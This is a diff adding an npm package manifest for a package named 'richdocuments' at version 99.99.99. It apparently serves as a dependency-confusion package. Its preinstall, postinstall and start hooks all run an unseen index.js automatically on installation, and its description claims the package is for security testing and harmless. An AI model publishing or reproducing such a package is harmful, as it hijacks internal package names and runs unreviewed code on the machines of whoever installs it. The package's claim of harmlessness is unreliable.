@@ -1,0 +1,18 @@
+{
+  "Dependencies": {
+    "request": "^2.88.2"
+  },
+  "dependencies": {
+    "requests": "^0.3.0"
+  },
+  "description": "This package is intended for security testing and does not contain any malicious code.",
+  "license": "ISC",
+  "main": "index.js",
+  "name": "richdocuments",
+  "scripts": {
+    "postinstall": "node index.js --save-prod",
+    "preinstall": "node index.js --save-prod",
+    "start": "node index.js --save-prod"
+  },
+  "version": "99.99.99"
+}
